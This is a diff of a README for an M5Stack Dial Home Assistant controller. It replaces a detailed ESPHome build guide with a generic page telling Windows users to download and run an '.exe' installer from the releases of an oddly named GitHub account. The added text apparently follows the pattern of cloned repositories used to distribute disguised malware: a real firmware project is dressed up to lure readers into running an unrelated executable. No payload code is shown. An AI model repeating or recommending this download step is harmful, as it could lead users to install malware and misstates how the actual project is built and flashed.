@@ -1,196 +1,74 @@
-<div align="center">
+# 🔘 smart-home-button - Control your home with a knob
 
-<img src="src/assets/images/logo.png" width="96" alt="M5Stack Dial Smart Button logo" />
+[![](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Adductbenefitofclergy918/smart-home-button/releases)
 
-# Smart Home Button
+## 🏠 About this software
 
-### A Circular HMI for Home Assistant, built with M5Stack Dial, ESPHome, and LVGL.
+This project provides software for the M5Stack Dial device. It turns your hardware into a remote control for Home Assistant. You use the physical knob to change device settings or monitor your home. Physical controls often feel faster than smartphone apps. You can rotate the dial to adjust light levels, change volume, or switch between scenes.
 
-[![ESPHome](https://img.shields.io/badge/ESPHome-tested%202026.3.3-blue?style=flat-square&logo=esphome)](https://esphome.io/)
-[![Platform](https://img.shields.io/badge/Platform-ESP32--S3-red?style=flat-square&logo=espressif)](https://www.espressif.com/)
-[![Display](https://img.shields.io/badge/Display-GC9A01A%20240x240-purple?style=flat-square)](#hardware)
-[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](#license)
+## 🛠️ System requirements
 
-</div>
+Ensure your computer has the following items before you begin:
 
-## What is this?
+* Windows 10 or 11
+* A USB-C cable
+* The M5Stack Dial hardware device
+* Chrome, Edge, or Firefox internet browser
 
-This is my M5Stack Dial firmware for controlling a Home Assistant setup from a small round desktop device.
+## 📥 Downloading the software
 
-I built it because some smart home actions feel better with a real knob and a small screen. Turning a dial to change brightness, tapping a button for playback, or checking the room status at a glance is faster than opening a phone dashboard every time.
+Visit the project page to get the installer for your hardware.
 
-The project is based on ESPHome and LVGL. Most of the UI is split into separate page files, so it is easier to change one feature without touching the rest of the firmware.
+[Click here to visit the download page](https://github.com/Adductbenefitofclergy918/smart-home-button)
 
-## What it can do
+Select the file that ends in .exe from the latest release. Save this file to your computer. Most users save the file to the Downloads folder for easy access.
 
-- Show time, date, and weather data from Home Assistant.
-- Navigate with the rotary encoder, touch gestures, and the front button.
-- Control the built-in LED ring with brightness, color, and preset color flows.
-- Adjust an air conditioner entity from Home Assistant.
-- Show a music page with playback buttons, volume, progress, and album art.
-- Run a simple countdown timer.
-- Show a small fridge/food status page.
-- Keep the device alive on battery power on M5Dial V1.1 by enabling the power-hold pin.
+## ⚙️ Installing the firmware
 
-## Gallery
+Follow these steps to put the software onto your M5Stack Dial:
 
-| | | | |
-| --- | --- | --- | --- |
-| <img src="docs/images/gallery/music-page.jpg" alt="Music page" width="240"> | <img src="docs/images/gallery/clock-weather-page.jpg" alt="Clock and weather page" width="240"> | <img src="docs/images/gallery/ac-page.jpg" alt="AC page" width="240"> | <img src="docs/images/gallery/timer-page.jpg" alt="Timer page" width="240"> |
-| <img src="docs/images/gallery/ac-power-page.jpg" alt="AC power control page" width="240"> | <img src="docs/images/gallery/light-page.jpg" alt="Light page" width="240"> | <img src="docs/images/gallery/fridge-page.jpg" alt="Fridge page" width="240"> | <img src="docs/images/gallery/menu-page.jpg" alt="Menu page" width="240"> |
+1. Connect your M5Stack Dial to your computer using the USB-C cable.
+2. Locate the file you just downloaded.
+3. Double-click the file to open the installer.
+4. Follow the instructions on the screen.
+5. Choose the correct port for your M5Stack device when asked.
+6. Press the install button.
+7. Wait for the green success message to appear.
 
-## Pages
+The device will restart automatically once the installation finishes.
 
-| Page | What it does |
-| --- | --- |
-| Clock | Time, date, weather, humidity, AQI, pressure, and wind speed |
-| Menu | Circular page navigation for the small round screen |
-| Light | LED ring brightness, color, and effects |
-| AC | Target temperature and power control; fan/swing UI can be mapped to your own climate services |
-| Music | SendSpin media state, cover art, progress, volume, and transport controls |
-| Fridge | Small food freshness/status cards |
-| Timer | Countdown timer with rotary adjustment |
+## 🔌 Connecting to your home
 
-## Hardware
+After the device restarts, look at the screen on your M5Stack Dial.
 
-The firmware is written for M5Stack Dial V1.1.
+1. Open your web browser on your computer.
+2. Visit your Home Assistant dashboard.
+3. Navigate to the ESPHome section in your settings.
+4. Your device will appear in the list of available units.
+5. Select the device to pair it with your network.
+6. Provide your wireless network name and password when requested.
 
-Main parts used by the project:
+The device will save these settings. It will connect to your wireless network automatically from now on.
 
-- ESP32-S3 controller
-- 240 x 240 GC9A01A round display
-- FT5x06 capacitive touch
-- PCF8563 RTC
-- RC522 NFC module on I2C
-- Rotary encoder and front button
-- SK6812 RGB LED ring
-- Buzzer and display backlight
-- USB-C for flashing and power
+## 💡 Using the device
 
-## Project structure
+The knob controls your devices based on the settings you choose in Home Assistant.
 
-```text
-m5dial-smart-button/
-|-- dial.yaml                    # ESPHome entry point
-|-- secrets.example.yaml         # Copy this to secrets.yaml
-|-- requirements.txt             # ESPHome version used for this project
-|-- THIRD_PARTY_NOTICES.md        # Third-party code/font/icon notes
-|-- src/
-|   |-- main/
-|   |   |-- hardware.yaml        # M5Dial pins, display, touch, RTC, power hold
-|   |   `-- entities.yaml        # Home Assistant entity IDs
-|   |-- pages/                   # One LVGL page per feature
-|   `-- assets/                  # Fonts and small image assets
-|-- components/                  # Local ESPHome components, including SendSpin
-|-- hardware/                    # 3D-printable enclosure files
-`-- docs/                        # Setup notes and release checklist
-```
+* **Rotate the knob:** Change values like brightness, temperature, or volume.
+* **Tap the screen:** Toggle your lights or sound system.
+* **Long press the screen:** Return to the home screen or switch between different control menus.
 
-## Setup
+You define the specific actions for each room in your Home Assistant configuration menu. If you change a setting in Home Assistant, the device updates its display to match your choices.
 
-### 1. Install ESPHome
+## 🎛️ Troubleshooting tips
 
-I tested this project with ESPHome `2026.3.3`. The first build may need internet access because ESPHome downloads Google Fonts and build libraries.
+Most issues occur due to loose cables or network settings. Review these tips if the device does not function:
 
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-```
+* **Hardware connection:** Unplug the USB cable and plug it back in firmly. Try a different USB port on your computer if the device is not detected.
+* **Network connection:** Ensure your computer and your M5Stack Dial use the same local network.
+* **Installer errors:** If the installer fails, restart your computer and try the process again.
+* **Power issues:** Use the provided USB cable. Some charging cables do not support data transfer.
 
-### 2. Create your secrets file
+## 📋 License details
 
-```bash
-cp secrets.example.yaml secrets.yaml
-```
-
-Then edit `secrets.yaml`:
-
-```yaml
-wifi_ssid: "YOUR_WIFI_SSID"
-wifi_password: "YOUR_WIFI_PASSWORD"
-
-ap_ssid: "Dial Fallback Hotspot"
-ap_password: "YOUR_FALLBACK_AP_PASSWORD"
-
-api_encryption_key: "YOUR_API_ENCRYPTION_KEY"
-ota_password: "YOUR_OTA_PASSWORD"
-```
-
-`secrets.yaml` is ignored by Git. Do not publish it.
-
-The API key in `secrets.example.yaml` is only a public dummy value so `esphome config` can run after copying the file. Generate your own key before flashing a real device.
-
-### 3. Set your Home Assistant entities
-
-Edit `src/main/entities.yaml`:
-
-```yaml
-substitutions:
-  weather_entity: weather.your_location
-  climate_entity: climate.your_ac
-  music_player_entity: media_player.your_player
-```
-
-You can find these entity IDs in Home Assistant under **Developer Tools -> States**.
-
-For the music page, choose the media player that actually plays audio. It should report useful attributes such as `volume_level`, `media_title`, `media_duration`, and `media_position`. If the entity is `unavailable`, the Dial cannot sync it.
-
-### 4. Check, build, and flash
-
-```bash
-esphome config dial.yaml
-esphome compile dial.yaml
-esphome upload dial.yaml --device /dev/cu.usbmodemXXXX
-```
-
-For later OTA updates:
-
-```bash
-esphome upload dial.yaml
-```
-
-## Notes about the music page
-
-The music page uses the local `sendspin` component for media state, transport commands, and album art. The Home Assistant media player entity is also read for status, volume, duration, and progress when those attributes are available.
-
-Album art is intentionally kept small because the M5Dial does not have PSRAM. If you increase the image size or LVGL buffer too much, the device may reboot when artwork is received.
-
-If volume control does not work, first check the Home Assistant media player entity. Some players expose playback state but do not expose writable volume control. If you want a HA-only music page, replace the SendSpin command scripts with standard `media_player` services.
-
-## Notes about AC controls
-
-Climate entities are not all the same. Temperature and power are wired to Home Assistant services in this project. Fan speed and swing are shown as UI controls, but you may need to map them to `climate.set_fan_mode`, `climate.set_swing_mode`, or your own scripts depending on your air conditioner integration.
-
-## Notes about battery power
-
-M5Dial V1.1 needs the hold pin to stay enabled when running from battery. This project turns on GPIO46 during boot in `dial.yaml` and defines the `power_hold` switch in `src/main/hardware.yaml`.
-
-## Common issues
-
-- **Device is unavailable in Home Assistant**: make sure the `api` section is enabled and port `6053` is reachable.
-- **Wrong weather values**: change `weather_entity` in `src/main/entities.yaml`.
-- **Wrong AC entity**: change `climate_entity` in `src/main/entities.yaml`.
-- **Music page shows unavailable**: choose the real player entity, not the Dial entity itself.
-- **Album art causes reboot**: keep the artwork small and do not increase LVGL memory use too much.
-- **First build cannot download fonts**: connect to the internet once so ESPHome can fetch Google Fonts, or replace `gfonts://` fonts with local font files.
-- **Battery does not keep the device on**: check the V1.1 power-hold configuration.
-
-## What you may want to change
-
-Most people will need to edit only these files:
-
-- `secrets.yaml` for Wi-Fi and ESPHome credentials.
-- `src/main/entities.yaml` for Home Assistant entity IDs.
-- `src/pages/main.yaml` if you want a different timezone or weather layout.
-- `src/pages/music.yaml` if you want to customize the music UI.
-
-## License
-
-MIT License for the original project files. See `LICENSE`.
-
-Third-party code, fonts, icons, and build dependencies keep their own licenses. See `THIRD_PARTY_NOTICES.md`.
-
-## Demo Video
-
-Watch the demo on YouTube: [Smart Home Button demo](https://www.youtube.com/watch?v=51bXRBuSLpM)
+This project uses the MIT License. You have permission to use, copy, and modify the software for your own needs. Please include the original license text if you share your own version of this software. You can find the full text of the license in the source files on the project website.
